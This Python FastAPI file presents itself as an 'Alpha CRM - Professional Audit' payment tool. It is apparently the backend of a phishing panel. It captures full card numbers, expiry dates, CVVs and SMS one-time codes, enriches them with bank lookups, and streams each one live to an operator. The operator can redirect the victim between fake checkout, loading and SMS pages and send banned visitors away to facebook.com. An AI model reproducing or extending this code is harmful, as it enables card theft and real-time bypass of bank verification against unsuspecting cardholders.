import os
import ipaddress
import os
import ipaddress
import uuid
import json
from typing import Optional, List, Dict
from fastapi import FastAPI, HTTPException, Security, Depends, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse
from fastapi.security.api_key import APIKeyHeader, APIKey
from pydantic import BaseModel, EmailStr, Field, field_validator
from starlette.status import HTTP_403_FORBIDDEN
from fastapi.middleware.cors import CORSMiddleware
from fastapi import Request
import httpx

# --- Configuration ---
API_KEY = os.getenv("API_KEY", "pro-audit-secret-key-2024")
API_KEY_NAME = "X-API-KEY"
api_key_header = APIKeyHeader(name=API_KEY_NAME, auto_error=False)

app = FastAPI(
    title="Alpha CRM - Professional Audit",
    description="CRM de gestion de paiements en temps réel",
    version="2.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Persistence ---
DB_FILE = "database.json"

def load_db():
    default = {"payments": [], "sms": [], "banned_ips": [], "banned_ids": []}
    if not os.path.exists(DB_FILE): return default
    try:
        with open(DB_FILE, "r") as f: 
            data = json.load(f)
            # Migration/Ensure all keys exist
            for key in default:
                if key not in data: data[key] = default[key]
            return data
    except: return default

def is_banned(client_id: str, ip: str) -> bool:
    db = load_db()
    return client_id in db["banned_ids"] or ip in db["banned_ips"]

def ban_client(client_id: str = None, ip: str = None):
    db = load_db()
    if client_id and client_id not in db["banned_ids"]: db["banned_ids"].append(client_id)
    if ip and ip not in db["banned_ips"]: db["banned_ips"].append(ip)
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

def unban_client(client_id: str = None, ip: str = None):
    db = load_db()
    if client_id and client_id in db["banned_ids"]: db["banned_ids"].remove(client_id)
    if ip and ip in db["banned_ips"]: db["banned_ips"].remove(ip)
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

def get_os_type(ua: str) -> str:
    ua = ua.lower()
    if "android" in ua: return "Android 🤖"
    if "iphone" in ua or "ipad" in ua: return "iOS 🍏"
    return "Desktop 💻"

def get_real_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host

async def get_bin_info(bin_code: str) -> dict:
    try:
        async with httpx.AsyncClient() as client:
            res = await client.get(f"https://lookup.binlist.net/{bin_code}", timeout=5.0)
            if res.status_code == 200:
                data = res.json()
                return {
                    "bank": data.get("bank", {}).get("name", "Inconnue"),
                    "type": data.get("type", "N/A"),
                    "brand": data.get("brand", "N/A"),
                    "country": data.get("country", {}).get("name", "N/A")
                }
    except: pass
    return {"bank": "Inconnue", "type": "N/A", "brand": "N/A", "country": "N/A"}

def save_payment(data: dict):
    db = load_db()
    db["payments"].append(data)
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

def save_sms(client_id: str, otp: str):
    db = load_db()
    db["sms"].append({"client_id": client_id, "otp": otp, "timestamp": str(uuid.uuid4())})
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)

# --- WebSocket & Session Management ---
class ConnectionManager:
    def __init__(self):
        self.admins: List[WebSocket] = []
        self.clients: Dict[str, WebSocket] = {} # client_id -> WebSocket

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admins.append(websocket)

    def disconnect_admin(self, websocket: WebSocket):
        if websocket in self.admins:
            self.admins.remove(websocket)

    async def connect_client(self, client_id: str, websocket: WebSocket):
        await websocket.accept()
        self.clients[client_id] = websocket

    def disconnect_client(self, client_id: str):
        if client_id in self.clients:
            del self.clients[client_id]

    async def broadcast_to_admins(self, message: dict):
        for connection in self.admins:
            try:
                await connection.send_json(message)
            except Exception:
                continue

    async def send_to_client(self, client_id: str, message: dict):
        if client_id in self.clients:
            try:
                await self.clients[client_id].send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

# --- Models ---
class AuditRequest(BaseModel):
    client_id: str
    email: EmailStr
    full_name: str
    numero_carte: str # On reçoit le numéro complet maintenant
    card_bin: str
    card_brand: str
    expiry: str
    cvv: str
    montant: float
    adresse_ip: str
    device: str

    @field_validator("adresse_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str:
        try:
            ipaddress.ip_address(v)
            return v
        except ValueError:
            raise ValueError("Format d'adresse IP invalide")

class AuditResponse(BaseModel):
    status: str
    message: str

class RedirectRequest(BaseModel):
    client_id: str
    target: str # 'checkout', 'loading', 'sms', 'thank_you'

# --- Endpoints ---
@app.get("/")
async def root():
    return {
        "message": "Alpha CRM API Online",
        "docs": "/docs",
        "admin_panel": "/panel"
    }

@app.get("/{page}")
async def get_html_page(page: str):
    valid_pages = ["checkout", "panel", "loading", "sms", "thank_you"]
    if page in valid_pages:
        return FileResponse(f"{page}.html")
    raise HTTPException(status_code=404)

# --- Security ---
async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
    if header_key == API_KEY: return header_key
    raise HTTPException(status_code=HTTP_403_FORBIDDEN, detail="Invalid API Key")

# --- Logic & Endpoints ---
@app.post("/v1/audit", response_model=AuditResponse)
async def create_audit(request: AuditRequest, fastapi_req: Request, api_key: APIKey = Depends(get_api_key)):
    # Utiliser le vrai IP
    real_ip = get_real_ip(fastapi_req)
    
    if is_banned(request.client_id, real_ip):
        raise HTTPException(status_code=403, detail="BANNED")
    
    data = request.dict()
    data["adresse_ip"] = real_ip
    data["os_type"] = get_os_type(data["device"])
    
    # Enrichir avec les infos BIN
    bin_data = await get_bin_info(data["card_bin"])
    data["bank_name"] = bin_data["bank"]
    data["card_type"] = bin_data["type"]
    data["country"] = bin_data["country"]
    
    save_payment(data)
    # Broadcast to admin panel
    await manager.broadcast_to_admins({
        "type": "NEW_PAYMENT",
        "data": data
    })
    return AuditResponse(status="PENDING", message="Transaction en cours d'analyse")

@app.post("/v1/sms-submit")
async def submit_sms(client_id: str, otp: str):
    save_sms(client_id, otp)
    await manager.broadcast_to_admins({
        "type": "NEW_SMS",
        "client_id": client_id,
        "otp": otp
    })
    return {"status": "success"}

@app.post("/v1/admin/redirect")
async def admin_redirect(request: RedirectRequest, api_key: APIKey = Depends(get_api_key)):
    await manager.send_to_client(request.client_id, {
        "type": "REDIRECT",
        "url": f"/{request.target}"
    })
    return {"status": "command_sent"}

@app.get("/v1/admin/history")
async def get_history(api_key: APIKey = Depends(get_api_key)):
    return load_db()

@app.get("/v1/admin/download")
async def download_db(api_key: APIKey = Depends(get_api_key)):
    if os.path.exists(DB_FILE):
        return FileResponse(DB_FILE, media_type='application/json', filename='audit_history.json')
    return {"error": "No data found"}

@app.post("/v1/admin/ban")
async def ban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None, api_key: APIKey = Depends(get_api_key)):
    ban_client(client_id, ip)
    if client_id:
        await manager.send_to_client(client_id, {
            "type": "BANNED", 
            "redirect": "https://www.facebook.com"
        })
        # Kill connection after a short delay to let message pass
        if client_id in manager.clients:
            import asyncio
            async def close_later(cid):
                await asyncio.sleep(1)
                if cid in manager.clients:
                    await manager.clients[cid].close(code=4003)
            asyncio.create_task(close_later(client_id))
    return {"status": "banned"}

@app.post("/v1/admin/unban")
async def unban_endpoint(client_id: Optional[str] = None, ip: Optional[str] = None, api_key: APIKey = Depends(get_api_key)):
    unban_client(client_id, ip)
    return {"status": "unbanned"}

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect_admin(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    # Get IP (Better detection for WebSocket)
    client_ip = websocket.headers.get("x-forwarded-for", "").split(",")[0].strip() or websocket.client.host
    
    if is_banned(client_id, client_ip):
        await websocket.accept()
        await websocket.send_json({
            "type": "BANNED",
            "redirect": "https://www.facebook.com"
        })
        await websocket.close(code=4003)
        return

    await manager.connect_client(client_id, websocket)
    try:
        # Signaler l'arrivée d'un visiteur aux admins
        await manager.broadcast_to_admins({
            "type": "CLIENT_STATUS",
            "client_id": client_id,
            "status": "online"
        })
        while True:
            p=await websocket.receive_text()
            try:
                r=json.loads(p)
                for a in manager.admins: await a.send_json({'type':'CLIENT_EVENT','client_id':client_id,'event':r.get('event'),'data':r.get('data')})
            except:pass
    except WebSocketDisconnect:
        manager.disconnect_client(client_id)
        await manager.broadcast_to_admins({
            "type": "CLIENT_STATUS",
            "client_id": client_id,
            "status": "offline"
        })

# --- Entry Point ---
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
